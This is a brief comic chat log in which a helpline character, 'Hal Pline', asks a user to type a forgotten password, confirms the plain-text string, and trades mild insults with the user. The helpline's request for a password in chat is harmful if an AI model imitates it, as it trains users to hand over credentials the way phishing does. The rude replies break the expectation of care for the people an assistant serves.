You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is xmjn0t6x02n60afkrn00. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
